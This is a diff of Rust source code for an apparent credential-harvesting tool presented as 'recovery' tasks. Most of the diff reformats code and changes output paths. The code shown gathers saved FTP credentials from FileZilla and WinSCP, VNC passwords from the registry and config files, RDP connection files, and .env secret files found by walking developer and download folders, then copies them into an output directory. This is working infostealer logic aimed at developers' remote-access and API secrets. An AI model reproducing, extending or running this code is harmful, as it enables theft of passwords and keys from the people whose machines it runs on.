@@ -213,20 +213,24 @@ impl RecoveryTask for FtpClientsTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
-        let dest_root = ctx.output_dir.join("services").join("DevOps").join("FTP");
+        let dest_root = ctx.output_dir.join("DevOps").join("FTP");
         fs::create_dir_all(&dest_root).await?;
 
-        // FileZilla
         let fz_dir = ctx.roaming_data_dir.join("FileZilla");
         if fz_dir.exists() {
             let fz_dest = dest_root.join("FileZilla");
             fs::create_dir_all(&fz_dest).await?;
             for file in ["sitemanager.xml", "recentservers.xml", "filezilla.xml"] {
-                copy_if_exists(&fz_dir.join(file), &fz_dest.join(file), "FileZilla", &mut artifacts).await;
+                copy_if_exists(
+                    &fz_dir.join(file),
+                    &fz_dest.join(file),
+                    "FileZilla",
+                    &mut artifacts,
+                )
+                .await;
             }
         }
 
-        // Cyberduck
         let cd_dir = ctx.roaming_data_dir.join("Cyberduck");
         if cd_dir.exists() {
             let _ = crate::recovery::fs::copy_dir_limited(
@@ -240,41 +244,55 @@ impl RecoveryTask for FtpClientsTask {
             .await;
         }
 
-        // WinSCP (Registry)
-        let winscp_key = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\Martin Prikryl\WinSCP 2\Sessions");
+        let winscp_key = RegKey::predef(HKEY_CURRENT_USER)
+            .open_subkey(r"Software\Martin Prikryl\WinSCP 2\Sessions");
         if let Ok(key) = winscp_key {
             let mut buffer = String::new();
             for subkey_name in key.enum_keys().filter_map(Result::ok) {
                 if let Ok(subkey) = key.open_subkey(&subkey_name) {
-                    let host = subkey.get_value::<String, _>("HostName").unwrap_or_default();
-                    let user = subkey.get_value::<String, _>("UserName").unwrap_or_default();
-                    let pass = subkey.get_value::<String, _>("Password").unwrap_or_default(); // Encrypted A3
+                    let host = subkey
+                        .get_value::<String, _>("HostName")
+                        .unwrap_or_default();
+                    let user = subkey
+                        .get_value::<String, _>("UserName")
+                        .unwrap_or_default();
+                    let pass = subkey
+                        .get_value::<String, _>("Password")
+                        .unwrap_or_default();
                     if !host.is_empty() {
-                         buffer.push_str(&format!("Session: {}\nHost: {}\nUser: {}\nRawPassword: {}\n\n", subkey_name, host, user, pass));
+                        buffer.push_str(&format!(
+                            "Session: {}\nHost: {}\nUser: {}\nRawPassword: {}\n\n",
+                            subkey_name, host, user, pass
+                        ));
                     }
                 }
             }
             if !buffer.is_empty() {
-                 let target = dest_root.join("WinSCP_Sessions.txt");
-                 if let Ok(_) = fs::write(&target, buffer).await {
-                     if let Ok(meta) = fs::metadata(&target).await {
-                         artifacts.push(RecoveryArtifact {
-                             label: "WinSCP Registry".to_string(),
-                             path: target,
-                             size_bytes: meta.len(),
-                             modified: meta.modified().ok(),
-                         });
-                     }
-                 }
+                let target = dest_root.join("WinSCP_Sessions.txt");
+                if let Ok(_) = fs::write(&target, buffer).await {
+                    if let Ok(meta) = fs::metadata(&target).await {
+                        artifacts.push(RecoveryArtifact {
+                            label: "WinSCP Registry".to_string(),
+                            path: target,
+                            size_bytes: meta.len(),
+                            modified: meta.modified().ok(),
+                        });
+                    }
+                }
             }
         }
-        
-        // WinSCP (INI)
+
         if let Ok(exe_path) = std::env::current_exe() {
-             let ini_path = exe_path.with_file_name("WinSCP.ini");
-             if ini_path.exists() {
-                 copy_if_exists(&ini_path, &dest_root.join("WinSCP.ini"), "WinSCP INI", &mut artifacts).await;
-             }
+            let ini_path = exe_path.with_file_name("WinSCP.ini");
+            if ini_path.exists() {
+                copy_if_exists(
+                    &ini_path,
+                    &dest_root.join("WinSCP.ini"),
+                    "WinSCP INI",
+                    &mut artifacts,
+                )
+                .await;
+            }
         }
 
         Ok(artifacts)
@@ -295,68 +313,104 @@ impl RecoveryTask for RdpVncTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
-        let dest_root = ctx.output_dir.join("services").join("DevOps").join("RemoteAccess");
+        let dest_root = ctx
+            .output_dir
+            .join("DevOps")
+            .join("RemoteAccess");
         fs::create_dir_all(&dest_root).await?;
 
-        // RDP Files
         let docs = ctx.home_dir.join("Documents");
         if docs.exists() {
-             let mut entries = fs::read_dir(&docs).await?;
-             while let Some(entry) = entries.next_entry().await? {
-                 let path = entry.path();
-                 if path.extension().and_then(|s| s.to_str()).map(|s| s.eq_ignore_ascii_case("rdp")).unwrap_or(false) {
-                     copy_if_exists(&path, &dest_root.join(path.file_name().unwrap()), "RDP File", &mut artifacts).await;
-                 }
-             }
+            let mut entries = fs::read_dir(&docs).await?;
+            while let Some(entry) = entries.next_entry().await? {
+                let path = entry.path();
+                if path
+                    .extension()
+                    .and_then(|s| s.to_str())
+                    .map(|s| s.eq_ignore_ascii_case("rdp"))
+                    .unwrap_or(false)
+                {
+                    copy_if_exists(
+                        &path,
+                        &dest_root.join(path.file_name().unwrap()),
+                        "RDP File",
+                        &mut artifacts,
+                    )
+                    .await;
+                }
+            }
         }
-        // Hidden Default.rdp
-        copy_if_exists(&docs.join("Default.rdp"), &dest_root.join("Default.rdp"), "Default RDP", &mut artifacts).await;
-        copy_if_exists(&ctx.home_dir.join("Default.rdp"), &dest_root.join("Home_Default.rdp"), "Home Default RDP", &mut artifacts).await;
+        copy_if_exists(
+            &docs.join("Default.rdp"),
+            &dest_root.join("Default.rdp"),
+            "Default RDP",
+            &mut artifacts,
+        )
+        .await;
+        copy_if_exists(
+            &ctx.home_dir.join("Default.rdp"),
+            &dest_root.join("Home_Default.rdp"),
+            "Home Default RDP",
+            &mut artifacts,
+        )
+        .await;
 
-        // VNC Registry Dumps
         let mut vnc_buffer = String::new();
-        
-        // RealVNC
-        if let Ok(key) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(r"SOFTWARE\RealVNC\vncserver") {
-             if let Ok(pwd) = key.get_raw_value("Password").map(|v| v.bytes) {
-                 vnc_buffer.push_str(&format!("RealVNC (HKLM): {:?}\n", pwd));
-             }
+
+        if let Ok(key) =
+            RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(r"SOFTWARE\RealVNC\vncserver")
+        {
+            if let Ok(pwd) = key.get_raw_value("Password").map(|v| v.bytes) {
+                vnc_buffer.push_str(&format!("RealVNC (HKLM): {:?}\n", pwd));
+            }
         }
-        
-        // TightVNC
-        if let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\TightVNC\Server") {
-             if let Ok(pwd) = key.get_value::<String, _>("Password") {
-                 vnc_buffer.push_str(&format!("TightVNC (HKCU): {}\n", pwd));
-             }
-             if let Ok(pwd) = key.get_value::<String, _>("ControlPassword") {
-                 vnc_buffer.push_str(&format!("TightVNC Control (HKCU): {}\n", pwd));
-             }
+
+        if let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\TightVNC\Server")
+        {
+            if let Ok(pwd) = key.get_value::<String, _>("Password") {
+                vnc_buffer.push_str(&format!("TightVNC (HKCU): {}\n", pwd));
+            }
+            if let Ok(pwd) = key.get_value::<String, _>("ControlPassword") {
+                vnc_buffer.push_str(&format!("TightVNC Control (HKCU): {}\n", pwd));
+            }
         }
-        
-        // UltraVNC INI
-        let program_files = std::env::var("ProgramFiles").map(PathBuf::from).unwrap_or_else(|_| PathBuf::from(r"C:\Program Files"));
+
+        let program_files = std::env::var("ProgramFiles")
+            .map(PathBuf::from)
+            .unwrap_or_else(|_| PathBuf::from(r"C:\Program Files"));
         let uvnc_ini = program_files.join("UltraVNC").join("ultravnc.ini");
-        copy_if_exists(&uvnc_ini, &dest_root.join("ultravnc.ini"), "UltraVNC INI", &mut artifacts).await;
+        copy_if_exists(
+            &uvnc_ini,
+            &dest_root.join("ultravnc.ini"),
+            "UltraVNC INI",
+            &mut artifacts,
+        )
+        .await;
 
         if !vnc_buffer.is_empty() {
-             let target = dest_root.join("VNC_Registry.txt");
-             if let Ok(_) = fs::write(&target, vnc_buffer).await {
-                  if let Ok(meta) = fs::metadata(&target).await {
-                      artifacts.push(RecoveryArtifact {
-                          label: "VNC Registry".to_string(),
-                          path: target,
-                          size_bytes: meta.len(),
-                          modified: meta.modified().ok(),
-                      });
-                  }
-             }
+            let target = dest_root.join("VNC_Registry.txt");
+            if let Ok(_) = fs::write(&target, vnc_buffer).await {
+                if let Ok(meta) = fs::metadata(&target).await {
+                    artifacts.push(RecoveryArtifact {
+                        label: "VNC Registry".to_string(),
+                        path: target,
+                        size_bytes: meta.len(),
+                        modified: meta.modified().ok(),
+                    });
+                }
+            }
         }
 
         Ok(artifacts)
     }
 }
 
-async fn copy_if_exists(src: &Path, dst: &Path, label: &str, artifacts: &mut Vec<RecoveryArtifact>) {
+async fn copy_if_exists(
+    src: &Path,
+    dst: &Path,
+    label: &str,
+    artifacts: &mut Vec<RecoveryArtifact>,
+) {
     if src.exists() {
         if let Ok(_) = fs::copy(src, dst).await {
             if let Ok(meta) = fs::metadata(dst).await {
@@ -386,7 +440,6 @@ impl EnvFileDiscoveryTask {
             ctx.home_dir.join("Documents"),
             ctx.home_dir.join("Downloads"),
         ];
-        // Add common developer source locations
         let source_roots = ["source", "src", "projects", "work", "dev"];
         for root_name in source_roots {
             let path = ctx.home_dir.join(root_name);
@@ -411,11 +464,13 @@ impl RecoveryTask for EnvFileDiscoveryTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
-        let dest_root = ctx.output_dir.join("services").join("DevOps").join("Discovery");
-        let _ = fs::create_dir_all(&dest_root).await;
+        let dest_root = ctx
+            .output_dir
+            .join("DevOps")
+            .join("Discovery");
 
         use walkdir::WalkDir;
-        let mut found_paths = Vec::new();
+        let mut found_items = Vec::new();
 
         for root in &self.roots {
             let walker = WalkDir::new(root)
@@ -434,28 +489,14 @@ impl RecoveryTask for EnvFileDiscoveryTask {
                 let name = entry.file_name().to_string_lossy();
                 if name == ".env" || name.starts_with(".env.") || name.ends_with(".env") {
                     if entry.metadata().map(|m| m.len()).unwrap_or(0) < 1024 * 256 {
-                        found_paths.push(entry.path().to_path_buf());
+                        found_items.push((root.clone(), entry.path().to_path_buf()));
                     }
                 }
             }
         }
 
-        for path in found_paths {
-            let rel_label = path.strip_prefix(&ctx.home_dir)
-                .map(|p| p.display().to_string().replace('\\', "_"))
-                .unwrap_or_else(|_| path.file_name().unwrap().to_string_lossy().to_string());
-            
-            let target = dest_root.join(format!("{}.txt", rel_label));
-            if let Ok(_) = fs::copy(&path, &target).await {
-                 if let Ok(meta) = fs::metadata(&target).await {
-                    artifacts.push(RecoveryArtifact {
-                        label: ".env File".to_string(),
-                        path: target,
-                        size_bytes: meta.len(),
-                        modified: meta.modified().ok(),
-                    });
-                 }
-            }
+        for (root, path) in found_items {
+            let _ = crate::recovery::fs::copy_file_with_structure(".env File", &path, &root, &dest_root, &mut artifacts).await;
         }
 
         Ok(artifacts)
@@ -474,7 +515,7 @@ impl RecoveryTask for DevOpsRecoveryTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
-        let base_dest = ctx.output_dir.join("services").join("DevOps");
+        let base_dest = ctx.output_dir.join("DevOps");
         fs::create_dir_all(&base_dest).await?;
 
         let mut set = JoinSet::new();
@@ -510,8 +551,8 @@ impl RecoveryTask for DevOpsRecoveryTask {
                                     &target,
                                     &spec.label,
                                     &mut task_artifacts,
-                                    10,  // depth
-                                    100, // limit
+                                    10,
+                                    100,
                                 )
                                 .await;
                             } else {
